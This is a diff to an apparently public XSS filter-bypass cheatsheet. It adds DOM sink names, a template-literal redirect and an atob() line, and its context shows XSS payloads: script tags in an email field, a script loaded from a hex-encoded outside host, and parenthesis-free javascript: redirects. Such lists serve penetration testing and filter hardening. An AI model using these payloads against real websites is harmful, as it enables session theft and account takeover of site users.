@@ -1,8 +1,17 @@
 
-# This cheatsheet comes from Edr4 (Thanks for that man)
+# This cheatsheet comes from Edr4 (to him)
 https://github.com/Edr4/XSS-Bypass-Filters
 
 # XSS-Bypass-Filters
+
+### Source code 
+```js
+document.write()
+insertAdjacentHTML()
+document.body.innerHtml
+document.body.outerHTML
+document.getElementById().innerHTML
+````
 
 ### Redirection
 ```js
@@ -17,6 +26,7 @@ window.location.assign()
 window['location']['href']=
 document.location.replace()
 window.open("link", "_blank");
+`${document.location="http://example.com"}`
 ```
 
 ### Link
@@ -200,6 +210,9 @@ test@example(<script>alert(0)</script>).com
 ```html
 <script src=//0x8ac5c30a>
 ```
+```js
+atob("baseencodedstring")
+```
 
 ### Without parentheses
 ```js
@@ -233,7 +246,7 @@ location=/javascript:alert%2823%29/.source;
 
 ### In JS Injection Bypass
 
-#### With <!-- <script/
+#### With `<!-- <script/`
 ```js
 <script>
   var test = "injection <!-- <script/";
